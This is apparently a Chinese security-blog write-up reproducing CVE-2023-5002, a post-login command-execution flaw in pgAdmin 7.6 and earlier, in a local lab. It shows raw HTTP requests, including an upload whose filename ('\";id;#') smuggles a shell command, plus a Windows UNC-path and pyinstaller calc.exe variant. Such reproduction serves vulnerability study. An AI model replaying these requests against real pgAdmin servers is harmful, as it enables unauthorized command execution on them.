#  CVE-2023-5002 pgAdmin <= 7.6 后台命令执行漏洞   
原创 标准云  蚁景网安   2024-06-21 17:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/TL4Y9UAcgruibhUn2nvLrs9mLNiaB1EywEk5fekyWAgJHrFof41PrHYJk9f0jbpDxWZHe4bl66MTEcIkd6nIxvZA/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBuqQIiaNnofKwn3K3CBgiaZJ4sW4sU1NslwEISj4s5NgRmKiatNLI7rBwg/640?wx_fmt=other&from=appmsg "null")  
  
  
我们可以看到针对于漏洞 CVE-2022-4223，官方做了一定的修复措施  
  
web\pgadmin\misc_  
init_.py#validate_binary_path  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBsVmaxgzzuk6St10tbTvWib9elmymezZBEQ7b8wzLo7hbAQLkK3yltJQ/640?wx_fmt=other&from=appmsg "null")  
  
  
首先是添加了 @login_required 进行权限校验。在 Flask 框架中，@login_required 装饰器通常与 Flask-Login 扩展一起使用。Flask-Login 提供了简单而强大的用户身份验证功能，其中包括 @login_required 装饰器用于保护需要登录用户才能访问的视图。当在一个函数、方法或类上应用 @login_required 装饰器时，它会检查当前用户是否已经登录。如果用户未登录，则会将其重定向到登录页面或返回相应的错误信息，而不允许访问被装饰的代码块。  
  
添加了权限校验之后，这个漏洞就从未授权的前台漏洞，转换为需要登录的后台漏洞了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBRPBSsj5plpryFaDKtXibuJSGTq2RRbHDlVC7bESC0OSpiaiaiapYDcVicXQ/640?wx_fmt=other&from=appmsg "null")  
  
  
同时对传入的路径进行校验，通过 os.path.exists 来判断是否存在  
### linux  
  
我们发现会对传入的路径进行校验的，那么在linux 下，我们可以通过在服务器上上传一个包含恶意文件名的文件，来进行绕过  
  
可以从 docker hub 上搜索 docker 资源 https://hub.docker.com/search?q=pgadmin  
```
docker pull dpage/pgadmin4:7.6
docker run -e 'PGADMIN_DEFAULT_EMAIL=test@example.com' -e 'PGADMIN_DEFAULT_PASSWORD=123456'  -p 5050:80 --name pgadmin -d  docker.io/dpage/pgadmin4:7.6
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBKk4nq8pXPwNoR5JMcNlMZezoeyvaEekErHouT2TkepNCxrtiayr7PMQ/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMB6GnOhkk0TsX86UWGpzvAMHFichWhdLlDZg3cd5IxVo7oLLrY3iaoSOQA/640?wx_fmt=other&from=appmsg "null")  
  
  
登录后台工具->存储管理器  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBeWNWYKiazSXMGibZkfPeUGyibEicod3Ie6lzHjbzfh6gia3QibibljRWGJXXw/640?wx_fmt=other&from=appmsg "null")  
  
  
上传一个包含恶意文件名的文件  
  
‍  
```
POST /file_manager/filemanager/3395111/ HTTP/1.1
Host: 127.0.0.1:5050
Content-Length: 491
X-pgA-CSRFToken: ImE3NDYzOGJhOWYxNDIzY2QzZDUwNTI3MWMzOGU4NGNhMmNhNzkzYTQi.Zi8ctA._DuZsbw2SE05kwuVkqgG7Y-KsjE
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryihDQGI2B09k9alLf
Origin: http://127.0.0.1:5050
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:5050/browser/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pga4_session=2397843f-fbe6-4481-947e-e30f73c6a0ee!GPxXiZuTJzjVn+sk6vhlLNAmjhQr6xIY0yumFSIGBAQ=; PGADMIN_LANGUAGE=zh
Connection: close

------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="newfile"; filename="\";id;#"
Content-Type: text/plain

123
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="mode"

add
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="currentpath"

/
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="storage_folder"

my_storage
------WebKitFormBoundaryihDQGI2B09k9alLf--

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBLfeulytcCuyJt1IXhaNahclThqGg8PQXcoicaK0XEjMYacK16EQgkyw/640?wx_fmt=other&from=appmsg "null")  
  
  
同时可以得到在文件在服务器上的路径  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBKuJB3cyypB7s1oDNB9oVEtia5iaESBuTg8ao2AMPHLbPxUKPpnuV7mQw/640?wx_fmt=other&from=appmsg "null")  
  
  
打开文件->配置  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBTGpc4ISFnZLNHQzYcbY27hlQoDmdLQ1EDs7Frk3vficSq1gsQmfSiavA/640?wx_fmt=other&from=appmsg "null")  
  
  
路径->二进制路径->填入恶意文件的位置  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBhTo4jyIaCQG5pRNTOh1KcFE3IVWxU5DNQ82cFMJkRsQm0hutSYT9yQ/640?wx_fmt=other&from=appmsg "null")  
  
  
点击运行  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBnM3txM8NDHJdJatKfROicMNSQ5EcYx5JR4lmrkEhGicBnEgDajiaSJ0tg/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBqkD2ozocPC54xuh0qpk0yQbyuaa9uIzhV4RpqNvLgSTGfJq4dEaDPg/640?wx_fmt=other&from=appmsg "null")  
  
### windows  
  
下载软件并进行安装 https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v6.21/windows/pgadmin4-6.21-x64.exe  
  
需要把C:\Users\username\AppData\Local\Programs\pgAdmin 4\v5\web 下的config.py 修改 DEFAULT_SERVER = '0.0.0.0'  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBnl0jxgnLBhJvv61SSCa1uwXTPKqpewHthYmcgMnp6TArOnPPIhOk4A/640?wx_fmt=other&from=appmsg "null")  
  
  
因为windows 无法利用拼接来执行命令，所以还是要想办法成功加载文件才行  
  
‍  
```
import os
binary_path = "\\\\192.168.222.128\\TMP\\"
UTILITIES_ARRAY = ['pg_dump', 'pg_dumpall', 'pg_restore', 'psql']
for utility in UTILITIES_ARRAY:
    full_path = os.path.abspath(
        os.path.join(binary_path, (utility if os.name != 'nt' else (utility + '.exe')))
    )
    print(full_path)
    print(os.path.exists(full_path))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBdddnvP1fR3lP0micITzUGCj8vsP6Mfe0cJS8X7F7qh6XLxMJPCwgSibg/640?wx_fmt=other&from=appmsg "null")  
  
  
windows 不能再利用共享资源来实现，所以也构造一个exe 上传并执行  
  
编译恶意的exe文件并放到上传  
- • pip install pyinstaller  
  
- • type execute_calc.pyimport subprocessdef execute_calc():    subprocess.call("calc.exe")if __name__ == "__main__":    execute_calc()  
  
- • pyinstaller --onefile execute_calc.py  
  
和linux启动有所不同  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBwQGvIJoL6S4GHdtaiahLGawTtI2fPCZw7xic2N2Q1HH6zjKiaMSVUySNA/640?wx_fmt=other&from=appmsg "null")  
  
Tools->import  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBLTkmCdyExIJ2jAKl3HZLdoLsQ9keM91s2vib3QMRu62M3YZDybxYFqQ/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBsnQVvSdMegg1LFkxgmSEPfBrLt7SPF2XouMaJCwt28lNo7Jcxicxibtg/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBIypJFMnZIEuKtutHdFbCtFdl77ObwgU7Gj9goA7atDZZH5E2ian8fkA/640?wx_fmt=other&from=appmsg "null")  
  
  
成功将恶意文件上传到服务器上  
  
同时构造请求数据包  
```
POST /misc/validate_binary_path HTTP/1.1
Host: 192.168.222.145:5050
X-pgA-CSRFToken: IjU4MzQ0OTM2Yzc3YzM5ZmE5Yjg0MjRhODVlNzkzZjM5MTViZDBmNzki.Zi9GcQ.pGwCjLqPq3fNzohIRNerpipIRK8
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://192.168.222.145:5050
Referer: http://192.168.222.145:5050/browser/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pga4_session=e6f521fc-e9f4-4c58-bf0a-e9abafb4ceb5!JG7fBzRT4FkugKb175t9vWdZpKmAtnbo0d/oPzcAbFI=; PGADMIN_LANGUAGE=en
Connection: close
Content-Type: application/json
Content-Length: 39

{"utility_path":"C:\\Users\\whippet\\"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBQRABguPC5pdbBsyM5nIbibxTCCz5ZHia1L6yMUFLeB5GQZ9m1lUBMgtQ/640?wx_fmt=other&from=appmsg "null")  
  
  
可能是因为本地测试的原因，后来尝试的时候发现，本地去调用共享文件时，可以接收到请求，但是很快就断开连接，所以最后的结果是 False  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBBpnQnoCuSaEd8ZibaZzDSRHk2K8QAtYEHcNqaHD0O4o1yTCt9rBbibwA/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruWxR2YXibm6DBcQdwv89qMBZ6tYtSxmDc72LmmZQjc7T7onnYsdMrTS0YhHFYaWXBG3F0Iicl1CxNg/640?wx_fmt=other&from=appmsg "null")  
  
  
所以环境为windwos 时可以利用共享资源来绕过 os.path.exists(）的检测  
  
[](http://mp.weixin.qq.com/s?__biz=MzkyNTY3Nzc3Mg==&mid=2247484713&idx=1&sn=28c29e069e8bd8ceb0bb9b8724563a15&chksm=c1c3a48af6b42d9c05802480e731f8054250576e425306e620b110db89c7b6ea9451be2b4976&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgruibhUn2nvLrs9mLNiaB1EywEeVJJJ3lvticFQQIqlOgoLUbB7FDAZGsoICZWUK2CnX8VV5mHBogoNqQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
